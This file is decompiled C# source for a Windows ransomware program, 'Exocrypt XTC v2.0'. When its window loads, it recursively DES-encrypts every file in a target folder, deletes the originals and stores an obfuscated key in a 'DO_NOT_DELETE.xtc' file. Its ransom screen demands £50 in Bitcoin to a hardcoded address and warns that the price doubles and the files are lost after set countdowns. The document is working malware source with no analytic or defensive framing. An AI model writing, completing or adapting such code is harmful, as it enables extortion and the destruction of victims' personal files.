using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Exocrypt_XTC_v2._0;

public class exoXxtc : Form
{
	public static List<string> files = new List<string>();

	public static string directorytoencrypt = "C:\\Users\\Forged\\Desktop\\Stuff\\C#\\Exocrypt XTC v2.0\\Exocrypt XTC v2.0\\bin\\Debug\\TestFiles";

	public static string characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!£$%^&*()_+-=#`¬¹\ufffd/.,?><±[]{}";

	private string var = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);

	public static string output;

	public static string personal;

	public static string extention;

	public static string key;

	public static string encryption1 = "9X?8T௧[C";

	public static string XTCipher_Key = "?><±[]{}abpqrstuvwxyzABCDEFGHIJKjklmnoST!£$%^&*()_+-=#`¬¹\ufffd/.,UVWXYZ12cdefghi78903456LMNOPQR";

	private IContainer components = null;

	private Panel panel1;

	private Panel panel2;

	private PictureBox pictureBox2;

	private Panel panel4;

	private Panel panel3;

	private Panel panel5;

	private RichTextBox richTextBox1;

	private Label label2;

	private Button button1;

	private TextBox textBox1;

	private Label label1;

	private Label label6;

	private Label label7;

	private Label label8;

	private Label label5;

	private Label label4;

	private Label label3;

	public exoXxtc()
	{
		InitializeComponent();
	}

	private void button1_Click(object sender, EventArgs e)
	{
		PasswordProtection passwordProtection = new PasswordProtection();
		((Control)passwordProtection).Show();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		GenKey();
		extention = "//OLD//";
		personal = encryption1;
		EncryptDir(directorytoencrypt);
		extention = ".xtc";
		personal = key;
		EncryptDir(directorytoencrypt);
	}

	private static void EncryptDir(string d)
	{
		DirectoryInfo directoryInfo = new DirectoryInfo(d);
		FileInfo[] array = directoryInfo.GetFiles();
		FileInfo[] array2 = array;
		foreach (FileInfo fileInfo in array2)
		{
			if (fileInfo.Extension.ToLower() != ".exe" && fileInfo.Extension.ToLower() != ".xtc")
			{
				if (extention != "//OLD//")
				{
					EncryptFile(fileInfo.FullName, fileInfo.FullName + extention, personal);
					File.Delete(fileInfo.FullName);
					files.Add(fileInfo.Name);
				}
				else
				{
					int startIndex = fileInfo.FullName.IndexOf(fileInfo.Extension);
					File.Move(fileInfo.FullName, fileInfo.FullName.Remove(startIndex));
					EncryptFile(fileInfo.FullName.Remove(startIndex), fileInfo.FullName, personal);
					File.Delete(fileInfo.FullName.Remove(startIndex));
				}
				Thread.Sleep(1);
			}
		}
		GetSubFoldersEncrypt(d);
	}

	private static void GetSubFoldersEncrypt(string d)
	{
		DirectoryInfo directoryInfo = new DirectoryInfo(d);
		DirectoryInfo[] directories = directoryInfo.GetDirectories();
		DirectoryInfo[] array = directories;
		foreach (DirectoryInfo directoryInfo2 in array)
		{
			EncryptDir(directoryInfo2.FullName);
		}
	}

	private static void GetSubFoldersDecrypt(string d)
	{
		DirectoryInfo directoryInfo = new DirectoryInfo(d);
		DirectoryInfo[] directories = directoryInfo.GetDirectories();
		DirectoryInfo[] array = directories;
		foreach (DirectoryInfo directoryInfo2 in array)
		{
			DecryptDir(directoryInfo2.FullName);
		}
	}

	private static void EncryptFile(string sInputFilename, string sOutputFilename, string sKey)
	{
		FileStream fileStream = new FileStream(sInputFilename, FileMode.Open, FileAccess.Read);
		FileStream fileStream2 = new FileStream(sOutputFilename, FileMode.Create, FileAccess.Write);
		DESCryptoServiceProvider dESCryptoServiceProvider = new DESCryptoServiceProvider();
		dESCryptoServiceProvider.Key = Encoding.ASCII.GetBytes(sKey);
		dESCryptoServiceProvider.IV = Encoding.ASCII.GetBytes(sKey);
		ICryptoTransform transform = dESCryptoServiceProvider.CreateEncryptor();
		CryptoStream cryptoStream = new CryptoStream(fileStream2, transform, CryptoStreamMode.Write);
		byte[] array = new byte[fileStream.Length];
		fileStream.Read(array, 0, array.Length);
		cryptoStream.Write(array, 0, array.Length);
		cryptoStream.Close();
		fileStream.Close();
		fileStream2.Close();
	}

	private static void DecryptFile(string sInputFilename, string sOutputFilename, string sKey)
	{
		FileStream fileStream = new FileStream(sInputFilename, FileMode.Open, FileAccess.Read);
		FileStream fileStream2 = new FileStream(sOutputFilename, FileMode.Create, FileAccess.Write);
		DESCryptoServiceProvider dESCryptoServiceProvider = new DESCryptoServiceProvider();
		dESCryptoServiceProvider.Key = Encoding.ASCII.GetBytes(sKey);
		dESCryptoServiceProvider.IV = Encoding.ASCII.GetBytes(sKey);
		ICryptoTransform transform = dESCryptoServiceProvider.CreateDecryptor();
		CryptoStream cryptoStream = new CryptoStream(fileStream2, transform, CryptoStreamMode.Write);
		byte[] array = new byte[fileStream.Length];
		fileStream.Read(array, 0, array.Length);
		cryptoStream.Write(array, 0, array.Length);
		cryptoStream.Close();
		fileStream.Close();
		fileStream2.Close();
	}

	public static void DecryptDir(string d)
	{
		DirectoryInfo directoryInfo = new DirectoryInfo(d);
		FileInfo[] array = directoryInfo.GetFiles();
		FileInfo[] array2 = array;
		foreach (FileInfo fileInfo in array2)
		{
			if (!(fileInfo.Extension.ToLower() == ".xtc"))
			{
				continue;
			}
			if (extention != "//OLD//")
			{
				int num = fileInfo.FullName.IndexOf(extention);
				if (num != -1)
				{
					DecryptFile(fileInfo.FullName, fileInfo.FullName.Remove(num), personal);
					File.Delete(fileInfo.FullName);
					files.Add(fileInfo.Name + "      [DECRYPTED]");
				}
			}
			else
			{
				string extension = fileInfo.Extension;
				int startIndex = fileInfo.FullName.IndexOf(extension);
				File.Move(fileInfo.FullName, fileInfo.FullName.Remove(startIndex));
				DecryptFile(fileInfo.FullName.Remove(startIndex), fileInfo.FullName, personal);
				File.Delete(fileInfo.FullName.Remove(startIndex));
			}
			Thread.Sleep(5);
		}
		GetSubFoldersDecrypt(d);
	}

	public void StartDecryptionALG()
	{
		//IL_0041: Unknown result type (might be due to invalid IL or missing references)
		extention = "//OLD//";
		personal = key;
		DecryptDir(directorytoencrypt);
		extention = ".xtc";
		personal = encryption1;
		DecryptDir(directorytoencrypt);
		MessageBox.Show("Your files have been decrypted, hope to see you soon ;)");
		File.Delete("DO_NOT_DELETE.xtc");
	}

	public void GenKey()
	{
		//IL_00f1: Unknown result type (might be due to invalid IL or missing references)
		if (!File.Exists("DO_NOT_DELETE.xtc"))
		{
			Random random = new Random();
			for (int i = 0; i != 8; i++)
			{
				int index = random.Next(0, characters.Count());
				key += characters[index];
			}
			File.WriteAllText("DO_NOT_DELETE", key);
			string contents = XTCipher_Encrypt("DO_NOT_DELETE");
			File.WriteAllText("DO_NOT_DELETE", contents);
			EncryptFile("DO_NOT_DELETE", "DO_NOT_DELETE.xtc", encryption1);
			File.Delete("DO_NOT_DELETE");
		}
		else
		{
			DecryptFile("DO_NOT_DELETE.xtc", "DO_NOT_DELETE", encryption1);
			string contents2 = XTCipher_Decrypt("DO_NOT_DELETE");
			File.WriteAllText("DO_NOT_DELETE", contents2);
			key = File.ReadAllText("DO_NOT_DELETE");
			File.Delete("DO_NOT_DELETE");
			MessageBox.Show(key);
		}
	}

	public string XTCipher_Encrypt(string file)
	{
		string text = File.ReadAllText(file);
		for (int i = 0; i != 8; i++)
		{
			for (int j = 0; j != characters.Count(); j++)
			{
				string text2 = characters[j].ToString();
				string text3 = text[i].ToString();
				if (text3 == text2)
				{
					output += text3.Replace(text3[0], XTCipher_Key[j]);
				}
			}
		}
		return output;
	}

	public string XTCipher_Decrypt(string file)
	{
		string text = File.ReadAllText(file);
		for (int i = 0; i != 8; i++)
		{
			for (int j = 0; j != XTCipher_Key.Count(); j++)
			{
				string text2 = XTCipher_Key[j].ToString();
				string text3 = text[i].ToString();
				if (text3 == text2)
				{
					output += text3.Replace(text3[0], characters[j]);
				}
			}
		}
		return output;
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0089: Expected O, but got Unknown
		//IL_008a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0094: Expected O, but got Unknown
		//IL_0095: Unknown result type (might be due to invalid IL or missing references)
		//IL_009f: Expected O, but got Unknown
		//IL_00a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00aa: Expected O, but got Unknown
		//IL_00ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b5: Expected O, but got Unknown
		//IL_00b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c0: Expected O, but got Unknown
		//IL_00c1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cb: Expected O, but got Unknown
		//IL_0361: Unknown result type (might be due to invalid IL or missing references)
		//IL_036b: Expected O, but got Unknown
		//IL_03e2: Unknown result type (might be due to invalid IL or missing references)
		//IL_03ec: Expected O, but got Unknown
		//IL_0476: Unknown result type (might be due to invalid IL or missing references)
		//IL_0480: Expected O, but got Unknown
		//IL_06b0: Unknown result type (might be due to invalid IL or missing references)
		//IL_06ba: Expected O, but got Unknown
		//IL_0738: Unknown result type (might be due to invalid IL or missing references)
		//IL_0742: Expected O, but got Unknown
		//IL_07d7: Unknown result type (might be due to invalid IL or missing references)
		//IL_07e1: Expected O, but got Unknown
		//IL_0878: Unknown result type (might be due to invalid IL or missing references)
		//IL_0882: Expected O, but got Unknown
		//IL_0919: Unknown result type (might be due to invalid IL or missing references)
		//IL_0923: Expected O, but got Unknown
		//IL_09ba: Unknown result type (might be due to invalid IL or missing references)
		//IL_09c4: Expected O, but got Unknown
		//IL_0a5b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a65: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(exoXxtc));
		panel1 = new Panel();
		panel5 = new Panel();
		button1 = new Button();
		textBox1 = new TextBox();
		label1 = new Label();
		richTextBox1 = new RichTextBox();
		label2 = new Label();
		panel2 = new Panel();
		panel4 = new Panel();
		panel3 = new Panel();
		pictureBox2 = new PictureBox();
		label3 = new Label();
		label4 = new Label();
		label5 = new Label();
		label6 = new Label();
		label7 = new Label();
		label8 = new Label();
		((Control)panel1).SuspendLayout();
		((Control)panel5).SuspendLayout();
		((Control)panel2).SuspendLayout();
		((Control)panel4).SuspendLayout();
		((Control)panel3).SuspendLayout();
		((ISupportInitialize)pictureBox2).BeginInit();
		((Control)this).SuspendLayout();
		((Control)panel1).get_Controls().Add((Control)(object)panel5);
		((Control)panel1).get_Controls().Add((Control)(object)richTextBox1);
		((Control)panel1).get_Controls().Add((Control)(object)label2);
		((Control)panel1).set_Location(new Point(169, 12));
		((Control)panel1).set_Name("panel1");
		((Control)panel1).set_Size(new Size(448, 370));
		((Control)panel1).set_TabIndex(2);
		panel5.set_BorderStyle((BorderStyle)1);
		((Control)panel5).get_Controls().Add((Control)(object)button1);
		((Control)panel5).get_Controls().Add((Control)(object)textBox1);
		((Control)panel5).get_Controls().Add((Control)(object)label1);
		((Control)panel5).set_Location(new Point(3, 308));
		((Control)panel5).set_Name("panel5");
		((Control)panel5).set_Size(new Size(445, 59));
		((Control)panel5).set_TabIndex(8);
		((Control)button1).set_Location(new Point(328, 15));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(97, 24));
		((Control)button1).set_TabIndex(8);
		((Control)button1).set_Text("Decrypt");
		((ButtonBase)button1).set_UseVisualStyleBackColor(true);
		((Control)button1).add_Click((EventHandler)button1_Click);
		((Control)textBox1).set_BackColor(Color.Maroon);
		((Control)textBox1).set_ForeColor(Color.White);
		((Control)textBox1).set_Location(new Point(87, 17));
		((Control)textBox1).set_Name("textBox1");
		((TextBoxBase)textBox1).set_ReadOnly(true);
		((Control)textBox1).set_Size(new Size(235, 20));
		((Control)textBox1).set_TabIndex(7);
		((Control)textBox1).set_Text("14pwAhmcC4PLcLQuMTDaLMsc4ThzHZycxK");
		textBox1.set_TextAlign((HorizontalAlignment)2);
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Font(new Font("Arial", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label1).set_ForeColor(Color.White);
		((Control)label1).set_Location(new Point(15, 18));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(70, 19));
		((Control)label1).set_TabIndex(6);
		((Control)label1).set_Text("£50 in ₿");
		((Control)richTextBox1).set_Font(new Font("Arial", 9f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)richTextBox1).set_Location(new Point(3, 35));
		((Control)richTextBox1).set_Name("richTextBox1");
		((TextBoxBase)richTextBox1).set_ReadOnly(true);
		((Control)richTextBox1).set_Size(new Size(445, 267));
		((Control)richTextBox1).set_TabIndex(6);
		((Control)richTextBox1).set_Text(componentResourceManager.GetString("richTextBox1.Text"));
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_Font(new Font("Arial Black", 15.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label2).set_ForeColor(Color.White);
		((Control)label2).set_Location(new Point(19, -1));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(410, 30));
		((Control)label2).set_TabIndex(5);
		((Control)label2).set_Text("Your Personal Files Are Encrypted!");
		((Control)panel2).get_Controls().Add((Control)(object)panel4);
		((Control)panel2).get_Controls().Add((Control)(object)panel3);
		((Control)panel2).get_Controls().Add((Control)(object)pictureBox2);
		((Control)panel2).set_Location(new Point(11, 12));
		((Control)panel2).set_Name("panel2");
		((Control)panel2).set_Size(new Size(152, 370));
		((Control)panel2).set_TabIndex(4);
		panel4.set_BorderStyle((BorderStyle)1);
		((Control)panel4).get_Controls().Add((Control)(object)label6);
		((Control)panel4).get_Controls().Add((Control)(object)label7);
		((Control)panel4).get_Controls().Add((Control)(object)label8);
		((Control)panel4).set_Location(new Point(9, 238));
		((Control)panel4).set_Name("panel4");
		((Control)panel4).set_Size(new Size(135, 114));
		((Control)panel4).set_TabIndex(7);
		panel3.set_BorderStyle((BorderStyle)1);
		((Control)panel3).get_Controls().Add((Control)(object)label5);
		((Control)panel3).get_Controls().Add((Control)(object)label4);
		((Control)panel3).get_Controls().Add((Control)(object)label3);
		((Control)panel3).set_Location(new Point(9, 118));
		((Control)panel3).set_Name("panel3");
		((Control)panel3).set_Size(new Size(135, 114));
		((Control)panel3).set_TabIndex(6);
		pictureBox2.set_Image((Image)componentResourceManager.GetObject("pictureBox2.Image"));
		((Control)pictureBox2).set_Location(new Point(25, 4));
		((Control)pictureBox2).set_Name("pictureBox2");
		((Control)pictureBox2).set_Size(new Size(103, 98));
		pictureBox2.set_SizeMode((PictureBoxSizeMode)1);
		pictureBox2.set_TabIndex(1);
		pictureBox2.set_TabStop(false);
		((Control)label3).set_BackColor(Color.Transparent);
		((Control)label3).set_Font(new Font("Arial", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label3).set_ForeColor(Color.Gold);
		((Control)label3).set_Location(new Point(0, 5));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(135, 19));
		((Control)label3).set_TabIndex(8);
		((Control)label3).set_Text("Double price in:");
		label3.set_TextAlign((ContentAlignment)32);
		((Control)label4).set_BackColor(Color.Transparent);
		((Control)label4).set_Font(new Font("Arial Black", 18f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label4).set_ForeColor(Color.White);
		((Control)label4).set_Location(new Point(0, 31));
		((Control)label4).set_Name("label4");
		((Control)label4).set_Size(new Size(135, 37));
		((Control)label4).set_TabIndex(9);
		((Control)label4).set_Text("5");
		label4.set_TextAlign((ContentAlignment)32);
		((Control)label5).set_BackColor(Color.Transparent);
		((Control)label5).set_Font(new Font("Arial", 11.25f, (FontStyle)2, (GraphicsUnit)3, (byte)0));
		((Control)label5).set_ForeColor(Color.White);
		((Control)label5).set_Location(new Point(-1, 66));
		((Control)label5).set_Name("label5");
		((Control)label5).set_Size(new Size(135, 19));
		((Control)label5).set_TabIndex(10);
		((Control)label5).set_Text("Days");
		label5.set_TextAlign((ContentAlignment)32);
		((Control)label6).set_BackColor(Color.Transparent);
		((Control)label6).set_Font(new Font("Arial", 11.25f, (FontStyle)2, (GraphicsUnit)3, (byte)0));
		((Control)label6).set_ForeColor(Color.White);
		((Control)label6).set_Location(new Point(-1, 66));
		((Control)label6).set_Name("label6");
		((Control)label6).set_Size(new Size(135, 19));
		((Control)label6).set_TabIndex(13);
		((Control)label6).set_Text("Days");
		label6.set_TextAlign((ContentAlignment)32);
		((Control)label7).set_BackColor(Color.Transparent);
		((Control)label7).set_Font(new Font("Arial Black", 18f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label7).set_ForeColor(Color.White);
		((Control)label7).set_Location(new Point(0, 31));
		((Control)label7).set_Name("label7");
		((Control)label7).set_Size(new Size(135, 37));
		((Control)label7).set_TabIndex(12);
		((Control)label7).set_Text("10");
		label7.set_TextAlign((ContentAlignment)32);
		((Control)label8).set_BackColor(Color.Transparent);
		((Control)label8).set_Font(new Font("Arial", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label8).set_ForeColor(Color.Gold);
		((Control)label8).set_Location(new Point(0, 5));
		((Control)label8).set_Name("label8");
		((Control)label8).set_Size(new Size(135, 19));
		((Control)label8).set_TabIndex(11);
		((Control)label8).set_Text("Files are lost in:");
		label8.set_TextAlign((ContentAlignment)32);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.Maroon);
		((Form)this).set_ClientSize(new Size(626, 386));
		((Control)this).get_Controls().Add((Control)(object)panel2);
		((Control)this).get_Controls().Add((Control)(object)panel1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)1);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("exoXxtc");
		((Control)this).set_Text("Exocrypt XTC v2.0");
		((Form)this).set_TopMost(true);
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)panel1).ResumeLayout(false);
		((Control)panel1).PerformLayout();
		((Control)panel5).ResumeLayout(false);
		((Control)panel5).PerformLayout();
		((Control)panel2).ResumeLayout(false);
		((Control)panel4).ResumeLayout(false);
		((Control)panel3).ResumeLayout(false);
		((ISupportInitialize)pictureBox2).EndInit();
		((Control)this).ResumeLayout(false);
	}
}
